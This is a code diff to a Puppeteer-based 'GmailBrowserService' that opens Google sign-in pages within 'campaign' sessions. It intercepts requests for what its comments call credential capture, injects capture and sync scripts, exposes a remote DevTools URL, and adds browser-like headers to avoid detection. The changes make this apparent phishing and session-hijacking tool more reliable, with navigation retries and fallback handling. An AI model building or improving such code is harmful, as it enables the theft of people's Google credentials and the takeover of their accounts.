@@ -141,8 +141,21 @@ class GmailBrowserService extends EventEmitter {
         this.cleanupSession(sessionToken);
       });
 
+      // Create new page with error handling
       const page = await browser.newPage();
       console.log(`📄 New page created for session: ${sessionToken}`);
+
+      // Prevent page from closing unexpectedly
+      page.on('close', () => {
+        console.log(`📄 Page closed for session: ${sessionToken}`);
+      });
+
+      // Set viewport first
+      await page.setViewport({
+        width: 1366,
+        height: 768,
+        deviceScaleFactor: 1,
+      });
 
       // Set realistic user agent and viewport
       await page.setUserAgent(
@@ -151,6 +164,15 @@ class GmailBrowserService extends EventEmitter {
 
       // Enable request/response interception for credential capture
       await page.setRequestInterception(true);
+
+      // Add extra headers to look more like a real browser
+      await page.setExtraHTTPHeaders({
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Upgrade-Insecure-Requests': '1',
+        'Cache-Control': 'max-age=0'
+      });
 
       // Store session data
       const sessionData = {
@@ -169,32 +191,83 @@ class GmailBrowserService extends EventEmitter {
       this.browsers.set(sessionToken, browser);
       this.pages.set(sessionToken, page);
 
-      // Get debugging URL for advanced control
-      const debuggingUrl = await this.getBrowserDebuggingUrl(browser);
-      sessionData.debuggingUrl = debuggingUrl;
+      // Wait a moment for page to stabilize
+      await new Promise(resolve => setTimeout(resolve, 1000));
 
-      // Set up event listeners
+      // Check if page is still alive before proceeding
+      if (page.isClosed()) {
+        throw new Error('Page closed immediately after creation');
+      }
+
+      // Get debugging URL for advanced control (with better error handling)
+      let debuggingUrl = null;
+      try {
+        debuggingUrl = await this.getBrowserDebuggingUrl(browser);
+        sessionData.debuggingUrl = debuggingUrl;
+      } catch (debugError) {
+        console.log(`⚠️  Could not get debugging URL: ${debugError.message}`);
+        // Continue without debugging URL
+      }
+
+      // Set up event listeners before navigation
       await this.setupPageEventListeners(sessionToken, page);
 
-      // Navigate to Gmail login with better error handling
+      // Navigate to Gmail login with enhanced error handling and retries
       console.log(`🌐 Navigating to Gmail login page...`);
-      try {
-        await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com', {
-          waitUntil: 'networkidle2',
-          timeout: 30000,
-        });
-        console.log(`✅ Successfully navigated to Gmail login`);
-      } catch (navError) {
-        console.error('Navigation error:', navError.message);
-        // Try a simpler navigation
-        await page.goto('https://accounts.google.com/', {
-          waitUntil: 'domcontentloaded',
-          timeout: 15000,
-        });
+      let navigationSuccess = false;
+      const urls = [
+        'https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com',
+        'https://accounts.google.com/',
+        'https://www.google.com/gmail/'
+      ];
+
+      for (let i = 0; i < urls.length && !navigationSuccess; i++) {
+        try {
+          console.log(`🌐 Trying URL ${i + 1}: ${urls[i]}`);
+          
+          // Check if page is still alive
+          if (page.isClosed()) {
+            throw new Error('Page closed during navigation attempt');
+          }
+
+          await page.goto(urls[i], {
+            waitUntil: ['domcontentloaded', 'networkidle0'],
+            timeout: 20000,
+          });
+          
+          // Wait for page to stabilize
+          await new Promise(resolve => setTimeout(resolve, 2000));
+          
+          // Verify we actually navigated
+          const currentUrl = page.url();
+          if (currentUrl && currentUrl !== 'about:blank') {
+            console.log(`✅ Successfully navigated to: ${currentUrl}`);
+            navigationSuccess = true;
+          }
+        } catch (navError) {
+          console.error(`❌ Navigation attempt ${i + 1} failed:`, navError.message);
+          
+          // If this is the last attempt, don't throw yet
+          if (i === urls.length - 1) {
+            // Try one more simple navigation
+            try {
+              await page.goto('data:text/html,<html><body><h1>Gmail Loading...</h1><p>Connecting to Gmail...</p></body></html>');
+              navigationSuccess = true;
+              console.log(`✅ Loaded fallback page`);
+            } catch (fallbackError) {
+              throw new Error(`All navigation attempts failed. Last error: ${navError.message}`);
+            }
+          }
+        }
       }
 
       // Inject credential capture and real-time sync scripts
-      await this.injectMonitoringScripts(page, sessionToken);
+      try {
+        await this.injectMonitoringScripts(page, sessionToken);
+      } catch (scriptError) {
+        console.log(`⚠️  Could not inject monitoring scripts: ${scriptError.message}`);
+        // Continue without monitoring scripts
+      }
 
       console.log(`✅ Gmail browser session created: ${sessionToken}`);
       
@@ -202,14 +275,14 @@ class GmailBrowserService extends EventEmitter {
       if (this.io) {
         this.io.to(`campaign-${campaignId}`).emit('gmailSessionCreated', {
           sessionToken,
-          debuggingUrl,
+          debuggingUrl: sessionData.debuggingUrl,
           status: 'active',
         });
       }
 
       return {
         sessionToken,
-        debuggingUrl,
+        debuggingUrl: sessionData.debuggingUrl,
         status: 'active',
         url: page.url(),
       };
@@ -243,12 +316,40 @@ class GmailBrowserService extends EventEmitter {
   async getBrowserDebuggingUrl(browser) {
     try {
       const browserWSEndpoint = browser.wsEndpoint();
-      const response = await fetch(browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '/json'));
-      const tabs = await response.json();
+      if (!browserWSEndpoint) {
+        throw new Error('No browser WebSocket endpoint available');
+      }
+
+      const httpEndpoint = browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '/json');
+      console.log(`🔍 Fetching debug info from: ${httpEndpoint}`);
       
-      if (tabs.length > 0) {
+      const response = await fetch(httpEndpoint, {
+        method: 'GET',
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        },
+        timeout: 5000
+      });
+      
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+      }
+      
+      const responseText = await response.text();
+      console.log(`🔍 Debug response: ${responseText.substring(0, 200)}...`);
+      
+      if (!responseText || responseText.startsWith('Unknown')) {
+        throw new Error('Invalid response from debug endpoint');
+      }
+      
+      const tabs = JSON.parse(responseText);
+      
+      if (tabs && tabs.length > 0) {
         const tab = tabs[0];
-        return `${browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '')}/devtools/inspector.html?ws=${tab.webSocketDebuggerUrl.replace('ws://', '')}`;
+        if (tab.webSocketDebuggerUrl) {
+          return `${browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '')}/devtools/inspector.html?ws=${tab.webSocketDebuggerUrl.replace('ws://', '')}`;
+        }
       }
       
       return null;
@@ -840,18 +941,20 @@ class GmailBrowserService extends EventEmitter {
         return false;
       }
 
-      const sessionData = this.activeSessions.get(sessionToken);
+      const browser = this.browsers.get(sessionToken);
+      const page = this.pages.get(sessionToken);
       
       // Check if browser is still connected
-      if (!sessionData.browser || !sessionData.browser.isConnected()) {
+      if (!browser || !browser.isConnected()) {
         console.log(`⚠️  Browser for session ${sessionToken} is disconnected`);
-        this.activeSessions.delete(sessionToken);
+        this.cleanupSession(sessionToken);
         return false;
       }
 
       // Check if page is still valid
-      if (!sessionData.page || sessionData.page.isClosed()) {
+      if (!page || page.isClosed()) {
         console.log(`⚠️  Page for session ${sessionToken} is closed`);
+        this.cleanupSession(sessionToken);
         return false;
       }
 
@@ -872,7 +975,7 @@ class GmailBrowserService extends EventEmitter {
         throw new Error('Session not found');
       }
 
-      const { page } = sessionData;
+      const page = this.pages.get(sessionToken);
       if (!page || page.isClosed()) {
         throw new Error('Browser page is not available');
       }
